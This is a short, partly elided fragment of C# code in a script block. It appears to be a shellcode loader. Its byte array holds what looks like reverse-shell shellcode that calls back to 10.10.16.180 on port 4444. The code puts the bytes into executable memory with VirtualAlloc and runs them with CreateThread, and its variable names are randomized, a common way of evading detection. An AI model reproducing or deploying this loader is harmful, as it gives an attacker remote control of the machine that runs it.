...
0x10,0x57,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,0x8b,0x58,0x20,0x8b,0x48,0x18,0x01,0xd3,0x50,
...
0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x0a,0x10,0xb4,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,
...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr lzdpkt_ = VirtualAlloc(IntPtr.Zero,(UIntPtr)pejpPrmy.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(pejpPrmy,0,lzdpkt_,pejpPrmy.Length);
        IntPtr qfdnh4tf = IntPtr.Zero;
        IntPtr rAUjITOk = CreateThread(IntPtr.Zero,UIntPtr.Zero,lzdpkt_,IntPtr.Zero,0,ref qfdnh4tf);
    }
</script>
